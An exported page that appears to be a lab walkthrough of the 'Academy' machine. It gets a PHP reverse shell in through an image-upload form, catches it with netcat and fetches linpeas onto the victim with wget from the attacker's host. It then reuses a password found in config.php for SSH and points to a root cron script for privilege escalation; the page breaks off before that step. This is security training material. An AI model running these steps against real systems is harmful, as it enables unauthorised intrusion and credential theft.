<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Exploiting Via Image Upload </title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="e91d72e6-fbc0-4215-bba9-87fb71611bcb" class="page sans"><header><h1 class="page-title">Exploiting Via Image Upload </h1><p class="page-description"></p></header><div class="page-body"><p id="3e0976c4-81da-42e9-a8ff-ce58535eebf8" class="">
</p><figure id="ff0a4b3d-0dac-437e-85c0-fe1d874aa576" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled.png"><img style="width:1351px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled.png"/></a></figure><p id="7fbc5c90-721d-4789-acce-5d4f29dce10d" class="">
</p><p id="9d3c7279-6fcd-4f18-933b-7bbf3b4dcd58" class="">We will try to upload something random and see if they have upload filtering or not </p><figure id="e0ff9696-9c84-4766-92eb-0be93d6268a5" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%201.png"><img style="width:1362px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%201.png"/></a></figure><p id="2b8b7071-ca5f-4a31-9071-782c4705d2b0" class="">
</p><p id="c010f535-20ac-4e64-918f-9c790a8e4984" class="">
</p><p id="8844ead6-f4d7-48bb-9d14-4381e7a26fd0" class="">Drag the pic into new tab for the path:</p><figure id="abfc2ff4-617f-4394-b0b2-d2e523c81f2b" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%202.png"><img style="width:1471px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%202.png"/></a></figure><p id="02be0173-462f-4cd2-8ec5-3997a02016e0" class="">
</p><p id="0536a1f1-8bc9-40ad-adaf-a8a224155e94" class="">
</p><p id="394581d9-58b4-499d-ac6f-19a2cfcf172f" class="">Now lets try to upload a reverse shell via that image upload part:</p><p id="0f3370ea-3b3d-494a-9e18-e902c2e3b52a" class="">
</p><p id="f01a93f6-0115-4a7a-bfd3-db3d37a91699" class="">Go to google and search for : php reverse shell github</p><p id="6ac25dd0-5cea-47b7-b9b7-5e1fd76f148a" class="">You will find : <a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></p><p id="3614a807-b18a-49f0-be80-b9490cfeb2c6" class="">Copy the raw code and create file &lt;file_name&gt;.php and change the ip ( IT SHOULD BE LHOST NOT RHOST )add and port numbers in the code.</p><p id="8d3d8142-8e48-48b5-a1be-1e3af39c8691" class="">
</p><figure id="d4a63791-3404-4300-8862-f49f0b9ee072" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%203.png"><img style="width:1888px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%203.png"/></a></figure><p id="dbf0752b-6ace-499f-ab3c-38927560cb29" class="">
</p><p id="2283eff1-cb78-479b-8018-988ee6295cf4" class="">
</p><p id="e8558724-6628-4a04-bb2d-fcddb6f3f6c9" class="">now listen on the same port you mentioned : <div class="indented"><p id="553c94e6-dabc-43e1-a99e-da6d6dfb23c6" class="">command : nc -nvlp 8595</p></div></p><p id="ae0b0163-f3d1-441a-acf4-f1d98ecd26d6" class="">Now upload the php file at the image part of the student.</p><p id="52f4678f-33f2-40c3-bd45-df1d7f6a0814" class="">After uploading that file we will get a shell access. As we can see in the below image.</p><p id="b1de6fda-d010-48db-a152-ae557cd38676" class="">
</p><figure id="90efa3b2-fd45-4564-8896-0808b72f5d90" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%204.png"><img style="width:1772px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%204.png"/></a></figure><p id="0dcce7fa-2379-4cf2-8476-813de03af97f" class="">
</p><p id="c6ec26b6-d5dc-4a33-b274-9331a7b61d85" class="">Now we need to do privilege escalation and get root access.</p><p id="9b26237a-cbc2-423a-bc48-20cc551685ba" class="">
</p><p id="0ad49d9d-3948-4f0b-bb53-c29f3db1d828" class="">
</p><p id="dd36a663-4588-4aaa-a0b4-75216bd67cde" class="">For that we will use a tool called Linpeas: <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p><p id="efa37d8a-2791-47b4-bb23-15f6417a5d9d" class="">
</p><p id="e503c684-e20a-4bbf-b047-0a964976798a" class="">To upload this file in the victim machine we need to start webserver for that i’m using python:<div class="indented"><p id="b0944900-fdb6-4e90-b8b4-3a8f1b9ca096" class="">command : python -m http.server 80</p><p id="77dcefa1-c1db-434d-b1bc-31dbe5db65e2" class="">Note: We need to start the python server in the folder from which we want to share files.</p></div></p><p id="4b69122d-69af-4173-b525-a7d1c9d6b6ad" class="">
</p><p id="d837297d-1ca5-4087-8c51-af1979186a9a" class="">Once python server is started , we need copy content from <a href="http://linpeas.sh">linpeas.sh</a> and create a new file &lt;filename&gt;.sh and paste in the python server directory.</p><p id="4425158c-ac58-4eb6-93d6-78b09097639b" class="">
</p><p id="a8e7d902-4fd2-44c2-b935-23e85049640c" class="">
</p><p id="b5f8ec82-ebc2-421e-8969-815be126fbf1" class="">Now to download the file  into the victim machine we need to first navigate to /tmp folder in the victim machine. And use the command : wget <a href="http://192.168.124.129/linpeas.sh">http://192.168.124.129/linpeas.sh</a></p><figure id="f8e287bf-8e07-4dc2-80e6-85225b5005b6" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%205.png"><img style="width:1467px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%205.png"/></a></figure><p id="1bab8ba0-f2b7-42a9-aae9-ca3cc421bada" class="">
</p><p id="b7ac9892-384a-47c6-8e59-0a24915992bc" class="">From above image we see that we have successfully transferred the file to the victim machine and it time to run the script.<div class="indented"><p id="418feaca-84c2-462a-8740-7bbef7b616b4" class="">Command : .linpeas.sh</p></div></p><p id="d42b37e4-631f-412a-8581-ce0a027b57ae" class="">A big script will run………</p><p id="8faea68a-ead3-4f4a-92ba-79863612126b" class="">
</p><figure id="260e92e2-77a2-4d96-b3f2-c1ea4d1a9d74" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%206.png"><img style="width:2019px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%206.png"/></a></figure><p id="0a256e17-cc61-47c0-a71e-0f649c2f6d12" class="">
</p><p id="b98acffc-4abc-4561-9a65-d472302b2587" class="">Look at the highlighted part RED and YELLOW means 95% PE vector. So I will paste the entire output but I will share the necessary part.</p><p id="32c7c023-6c40-43aa-bf17-b0e26c9aa002" class="">
</p><p id="bccc2965-ca27-4337-a60e-ed85a83f7e09" class="">
</p><figure id="1ceaf747-679e-4750-a1ed-22aadce864cc" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%207.png"><img style="width:2027px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%207.png"/></a></figure><p id="82fe2153-d883-4912-8b0e-dff9c7765c96" class="">We can see there is cron job running . </p><p id="38612685-3f13-4f76-8efa-c2af8f8118db" class="">
</p><p id="22df7361-ed27-45a2-82d9-768be8de9410" class="">Once we navigate to that folder : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0621365d-34ef-4f39-ac7a-cf355053ddad" class="code"><code class="language-Bash">$ cd /home/grimmie
$ ls
backup.sh
$ cat backup.sh
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip</code></pre><p id="95eca58f-0545-46db-82ec-23e4eeaa101f" class="">
</p><p id="d8cdab8a-313c-4bc6-a31b-51884068e23b" class="">There is file called <a href="http://backup.sh">backup.sh</a> and now we need find out at what the backup is taking place so that we can exploit it.</p><p id="0a248a1a-ba4c-4afd-be55-3ce7ba24da84" class="">
</p><p id="cbce65ac-27c5-4c44-ab7a-b09de40f4e65" class="">
</p><figure id="c04cfb92-6231-4577-96fc-1885db682346" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%208.png"><img style="width:2005px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%208.png"/></a></figure><p id="8ea18497-f2fa-4f0f-a744-313703cf4718" class="">In the Linpeas we can also see “My_V3ryS3cur3_P4ss” several times so we try to login via ssh to the user ( grimmie ) we found. its like trail and error.</p><p id="1c98ed3e-05af-4b6c-ba6f-bd841f76f512" class="">Note : It literally searching passwords in config PHP files </p><p id="21599fc8-3036-41c0-81c4-55e1195112c5" class="">Now if goto the path : /var/www/html/academy/includes/config.php</p><figure id="82133b75-81b9-4181-a883-b3b7944dc783" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%209.png"><img style="width:1045px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%209.png"/></a></figure><p id="b6c3076e-8124-47b7-95ed-cd13dc99c3e4" class="">We can see this config.php  several times and from the before image its says “searching passwords in config PHP files ” so lets view this file.</p><figure id="c37a916c-edfa-487e-81cd-4ee6357cb77b" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2010.png"><img style="width:1894px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2010.png"/></a></figure><p id="4932df5a-6312-44f2-bb53-3c27ab749204" class="">
</p><p id="0798ff40-47ab-45fd-b2b5-4412494d3e07" class="">Now lets try to login via ssh with the credentials we found.</p><p id="8117ea06-7c46-415e-b4aa-f6264807bdf0" class="">
</p><p id="864ea753-5321-4a7d-ab27-2c55e821b34b" class="">
</p><p id="e724b806-b796-447b-8793-5b35eb26dd96" class="">
</p><p id="ec1fdb88-57fa-4cb6-a0d4-22f514de46af" class="">
</p><p id="9a081591-49d5-4090-81b3-df0cda7f9324" class="">
</p><figure id="f68a00f5-9fb5-43fc-8efe-edacb5471fc3" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2011.png"><img style="width:1322px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2011.png"/></a></figure><p id="10a3607a-fa95-4527-8c53-06641287f2ec" class="">
</p><p id="db54749f-7d6c-482c-ace0-aa81ce939d4f" class="">Wooo!!! We got access…</p><p id="1bcb8ff4-d337-429b-bdf0-9a19f7fbfa32" class="">
</p><p id="0f74230e-29b7-4cb2-9bde-c39ab60d2005" class="">Now we need to escalate privilege to root . As we can see there is a backup file we found , Now we need to see at what time it executes. </p><p id="938ea381-47eb-40f7-84eb-eaca5c240875" class="">
</p><figure id="6a9d5577-ac4c-4a2b-9491-832801bd4ae4" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2012.png"><img style="width:2027px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2012.png"/></a></figure><p id="07c4f246-2a87-4792-85ac-615963303463" class="">As we can see * * * * * these stars basically means</p><p id="72acefec-f932-48b1-82bd-d12498ae03b8" class="">Minutes (0-59)<br/>Hours (0-23)<br/>Day of Month (1-31)<br/>Month (1-12)<br/>Day of week (0-7 : 0 and 7 both mean Sunday)<br/></p><p id="ce83c490-10c0-41fc-8c78-389af7d261de" class="">
</p><p id="aa8d9f4c-d28a-403a-8423-deb080ca0443" class="">That means this script runs every day every min every month. </p><p id="3cb41662-a4ef-4381-b1de-be8260a6d186" class="">But why we are running that “pspy” look at the page below.<div class="indented"><figure id="fd06fef8-8497-4262-9eb2-43a99b9f006d" class="link-to-page"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Why%20Pspy%20fd06fef8849742629eb243a99b9f006d.html">Why Pspy</a></figure></div></p><p id="41020634-48f1-48c5-89b4-def811dc4041" class="">
</p><p id="b556ab81-2df3-4e51-bc9d-54cea4722ffc" class="">Now lets download  “64 bit big, static version: <code>pspy64</code> <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64">download</a> “ from : <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><p id="ed94d288-1f73-41e9-8619-2519edd72eaa" class="">
</p><p id="042faac5-df3d-4db8-aca8-ffc0ebe599a8" class="">Once you have downloaded and copied the pspy64 into the python http server directory we can access it from the victim machine or the victim ssh connection (The ssh we just logged in ).</p><p id="047b5b65-240e-4f4d-855f-fda2d9418a38" class="">
</p><p id="ed141471-9615-4176-bf08-940ab2950937" class="">Now just “wget” it :</p><p id="4c57cfaa-1d5f-4143-b0fd-20d64ddd2b4a" class="">
